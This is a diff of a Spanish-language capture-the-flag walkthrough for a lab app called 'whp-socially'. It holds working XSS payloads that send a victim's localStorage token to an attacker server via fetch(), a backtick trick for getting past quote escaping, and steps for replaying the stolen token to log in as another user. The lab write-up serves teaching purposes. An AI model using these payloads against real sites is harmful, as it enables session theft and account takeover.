@@ -65,24 +65,81 @@ http://whp-socially/?next=j%09avascript:print()
 
 El código JavaScript se ejecuta correctamente. No obstante, no es muy útil, ya que solo genera una ventana de impresión. Vamos a intentar algo más interesante, como por ejemplo, robar la sesión del usuario.
 
-Pero antes, necesitamos identificar cómo se almacena la sesión del usuario. Normalmente, se almacena en una cookie, pero no siempre es así. Para determinar esto, revisamos los archivos JavaScript que se están ejecutando en la página principal. En este caso, tenemos un archivo llamado "main.js".
+Pero antes, necesitamos identificar cómo almacena la sesión / autenticación la aplicación. Normalmente, se almacena en una cookie, pero no siempre es así. Para determinar esto, revisamos los archivos JavaScript que se están ejecutando en la página principal. En este caso, tenemos un archivo llamado "main.js".
 
-![](img/localStoragetoken.png)
+![](localStoragetoken.png)
 
-En este archivo, podemos ver que se llama a la función "localStorage.getItem('token')", que es la que se encarga de obtener el token de la sesión del usuario desde el almacenamiento local del navegador.
+En este archivo, podemos ver que se llama a la función "localStorage.getItem('token')", que es la que se encarga de obtener el token del usuario desde el almacenamiento local del navegador.
 
 En caso de que haya dudas, la diferencia principal entre las cookies y el almacenamiento local es que las cookies se almacenan en el navegador y el servidor, mientras que el almacenamiento local solo se almacena en el navegador.
 
-Vamos a intentar robar la sesión del usuario. Necesitamos un servidor de atacante para recibir el token de la víctima. Para esto, podemos usar un servidor HTTP de Python, con el siguiente comando:
+Vamos a intentar robar el token del usuario. Necesitamos un servidor de atacante para recibir el token de la víctima. Para esto, podemos usar un servidor HTTP de Python, con el siguiente comando:
 
-    sudo python3 -m http.server 80
+    python3 -m http.server 80
 
-![](img/pythonhttpserver.png)
+![](pythonhttpserver.png)
 
 Ahora, vamos a ver cuál es la dirección IP de nuestra máquina de atacante. Para esto, podemos usar el comando "ifconfig". La dirección IP que nos interesa es la de la interfaz puente de Docker, con el nombre que empieza con "br-".
 
-![](img/ifconfig.png)
+![](ifconfig.png)
 
-Con esta información, podemos crear un payload que utiliza la función "fetch()" para enviar el token de sesión al servidor de atacante.
+Con esta información, podemos crear un payload que utilice la función "fetch()" para enviar el token al servidor de atacante mediante una petición GET. El enlace quedaría de la siguiente manera:
+
+```
+http://whp-socially/?next=j%09avascript:fetch(%27http://172.18.0.1/%27%2blocalStorage.getItem(%27token%27))
+```
+
+**Importante:** Hay que reemplazar \<IP_ATACANTE\> por la dirección IP de la máquina de atacante. Además, hay que codificar el carácter "+" en URL, para que no se interprete como un espacio en blanco.
+
+Si probamos el enlace, veremos que la petición no llega al servidor de atacante. Revisemos la consola del navegador para ver qué está pasando.
+
+![](blockedFetch.png)
+
+Al parecer, hay un error de sintaxis relacionado con el carácter "&". Para depurar esto, podemos enviar la petición al Repeater de Burp Suite y ver dónde está el problema.
+
+![](blockedFetchRepeater.png)
+
+El problema está en que el carácter "%27" (comilla simple codificada en URL) está siendo codificado mediante HTML Entities. Esto se debe a que la aplicación está haciendo un escape de los caracteres especiales.
+
+Para solucionar esto, podemos ver si el resto de comillas están siendo escapadas también. Con JavaScript, podemos representar strings mediante comillas simples, dobles o backticks.
+
+![](checkingQuoteChars.png)
+
+En este caso, los backticks no están siendo escapados. Por lo tanto, podemos utilizarlos para solucionar el problema. El enlace quedaría de la siguiente manera:
+
+```
+http://whp-socially/?next=j%09avascript:fetch(`http://172.18.0.1/`%2blocalStorage.getItem(`token`))
+```
+
+Si probamos el enlace, vemos que la petición llega al servidor de atacante.
+
+![](requestReceived.png)
+
+Nos llega el valor "null", esto se debe a que no estamos autenticados, pero esto nos sirve para comprobar que la petición llega correctamente. Ahora, vamos a enviar la petición a la víctima, utilizando el servidor de explotación disponible en http://whp-exploitserver/.
+
+![](exploitServer.png)
+
+Pulsamos el botón "Deliver URL to victim" para enviar el enlace a la víctima. El servidor de explotación simula la navegación de la víctima y vemos que el token llega correctamente al servidor del atacante.
+
+![](tokenReceived.png)
+
+Ahora, podemos utilizar el token para autenticarnos en la aplicación de http://whp-socially/. Abrimos la consola del navegador y ejecutamos el siguiente código JavaScript:
+
+    localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6NX0.<FIRMA>')
+
+**Importante:** Hay que reemplazar \<FIRMA\> por la firma del token que hemos obtenido. Además, para que la consola nos deje pegar el código anterior, hay que escribir "allow pasting" justo antes de ejecutar el código.
+
+![](localStoragesetItem.png)
+
+Si recargamos la página, comprobamos que nos hemos autenticado correctamente con la cuenta de "ares".
+
+![](loggedinasares.png)
+
+</details>
+
+## Etapa 2: Acceder como admin
+
+<details>
+<summary>Mostrar</summary>
 
 </details>
